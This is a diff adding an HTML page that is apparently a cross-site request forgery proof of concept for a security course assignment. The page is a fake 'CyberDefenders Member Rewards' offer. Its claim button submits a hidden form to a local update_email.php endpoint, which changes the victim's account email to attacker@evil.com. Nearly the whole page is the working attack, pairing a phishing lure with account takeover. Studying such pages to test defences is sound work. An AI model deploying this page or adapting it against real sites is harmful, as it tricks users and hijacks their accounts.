@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefenders Network &bull; Partner Reward Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f172a;
+            color: #f8fafc;
+            padding: 40px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .box {
+            max-width: 500px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 35px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        h1 {
+            color: #38bdf8;
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .reward-badge {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            margin-bottom: 18px;
+        }
+
+        .btn-claim {
+            background: #38bdf8;
+            color: #090d16;
+            padding: 14px 28px;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+        }
+
+        .btn-claim:hover {
+            background: #7dd3fc;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="box">
+        <div class="reward-badge">Exclusive Partner Benefit</div>
+        <h1>CyberDefenders Member Rewards</h1>
+        <p>
+            Congratulations! Your enterprise organization has been selected to receive a complimentary hardware
+            authentication token credit. Click below to verify and sync your credentials.
+        </p>
+
+        <!-- Forged Request Target -->
+        <form id="csrfForm" action="http://localhost/IS_Assignment/backend/api/update_email.php" method="GET">
+            <input type="hidden" name="email" value="attacker@evil.com">
+            <input type="hidden" name="redirect_back" value="1">
+            <button type="submit" class="btn-claim">Claim Enterprise Reward &rarr;</button>
+        </form>
+    </div>
+
+    <script>
+        if (window.location.protocol === 'http:' || window.location.protocol === 'https:') {
+            document.getElementById('csrfForm').action = '../backend/api/update_email.php';
+        }
+    </script>
+</body>
+
+</html>
